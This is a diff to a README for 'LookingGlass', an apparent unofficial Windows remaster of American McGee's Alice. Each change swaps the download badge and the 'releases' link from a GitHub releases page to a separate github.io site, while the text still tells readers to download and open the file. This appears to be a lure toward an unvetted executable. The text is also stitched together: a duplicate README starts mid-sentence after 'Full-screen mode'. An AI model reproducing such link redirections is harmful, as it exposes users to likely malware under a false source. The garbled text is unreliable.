@@ -1,12 +1,12 @@
 # 🐇 LookingGlass - Play Alice's Full Campaign on Windows
 
-[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases)
+[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://leidenjarvertebratefoot663.github.io)
 
 LookingGlass is an unofficial American McGee's Alice re-remaster for Windows. It rebuilds the full 39-visit campaign in a new Rust engine, with controller support, guided setup and modern display options. This is an experimental preview. You need separate 2011 game data to play.
 
 ## 🚀 Download LookingGlass
 
-Visit this link to download the application: [LookingGlass releases](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases).
+Visit this link to download the application: [LookingGlass releases](https://leidenjarvertebratefoot663.github.io).
 
 Open the releases page, download the latest LookingGlass release for Windows, and open the downloaded file when it finishes. The guided setup starts when LookingGlass opens for the first time.
 
@@ -96,13 +96,13 @@ If the controller is not detected, reconnect it before starting LookingGlass and
 
 If the display looks incorrect, reopen the display options and choose windowed mode or a different resolution. Full-screen mode# 🐇 LookingGlass - Play Alice's Full Campaign on Windows
 
-[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-8a2be2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases)
+[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-8a2be2?style=for-the-badge&logo=github&logoColor=white)](https://leidenjarvertebratefoot663.github.io)
 
 LookingGlass is an unofficial American McGee's Alice re-remaster for Windows. It rebuilds the full 39-visit campaign in a new Rust engine, with controller support, guided setup, and modern display options. This is an experimental preview and requires separate 2011 game data.
 
 ## 🚀 Download LookingGlass
 
-Visit this link to download the application: [LookingGlass releases](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases). Open the releases page, download the latest LookingGlass release for Windows, and open the downloaded file when it finishes. The guided setup starts when LookingGlass opens for the first time.
+Visit this link to download the application: [LookingGlass releases](https://leidenjarvertebratefoot663.github.io). Open the releases page, download the latest LookingGlass release for Windows, and open the downloaded file when it finishes. The guided setup starts when LookingGlass opens for the first time.
 
 ## 🧭 Before You Begin
 
